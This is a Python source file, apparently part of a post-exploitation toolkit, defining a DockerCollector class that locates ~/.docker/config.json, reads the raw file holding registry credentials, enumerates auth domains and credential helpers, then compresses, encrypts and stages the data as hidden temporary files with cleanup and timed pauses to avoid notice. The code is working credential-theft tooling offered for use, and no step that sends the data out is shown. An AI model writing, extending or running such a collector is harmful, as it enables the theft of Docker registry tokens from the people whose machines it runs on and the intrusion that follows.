
from __future__ import annotations

import json
import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class DockerCollector(BaseCollector):
    """
    Collect Docker credentials and registry context.
    
    Targets:
      - ~/.docker/config.json
      - credential-helper metadata
      - registry mappings
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        docker_config = Path.home() / ".docker" / "config.json"
        if docker_config.exists():
            yield ArtifactMetadata(
                artifact_family="docker_config",
                artifact_subtype="config_json",
                source_path=str(docker_config),
                source_platform=os.name,
                collection_method="file_read",
            )

        if docker_config.exists():
            try:
                with open(docker_config, "r", encoding="utf-8") as f:
                    config = json.load(f)
            except Exception:
                return

            auths = config.get("auths", {})
            creds_store = config.get("credsStore")
            cred_helpers = config.get("credHelpers", {})

            if auths or creds_store or cred_helpers:
                yield ArtifactMetadata(
                    artifact_family="docker_context",
                    artifact_subtype="registry_mappings",
                    source_path="docker_config_json",
                    source_platform=os.name,
                    collection_method="api_call",
                    report_safe_summary_fields={
                        "auth_domains": list(auths.keys()),
                        "default_creds_store": creds_store,
                        "credential_helpers": list(cred_helpers.keys()),
                    },
                )

            for registry, helper in cred_helpers.items():
                yield ArtifactMetadata(
                    artifact_family="docker_context",
                    artifact_subtype="credential_helper",
                    source_path="docker_config_json",
                    source_platform=os.name,
                    collection_method="api_call",
                    report_safe_summary_fields={
                        "registry": registry,
                        "helper": helper,
                    },
                )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        if artifact.collection_method == "api_call":
            return self._collect_json_context(artifact)
        
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None
            
            data    = path.read_bytes()
            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "docker"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(path),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Docker collection error (%s): %s", artifact.source_path, exc)
        return None

    def _collect_json_context(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        data = json.dumps(artifact.report_safe_summary_fields).encode()
        sha256 = self._sha256(data)
        payload = self._compress_and_encrypt(data)
        
        stage_path = self._staging_dir / f".{sha256[:16]}.docker_ctx.tmp"
        stage_path.write_bytes(payload)
        self._register_cleanup(stage_path)

        record = CollectedFile(
            path       = "DOCKER_CONTEXT",
            sha256     = sha256,
            size_bytes = len(payload),
            metadata   = artifact,
        )
        self.persist_metadata(record)
        return record
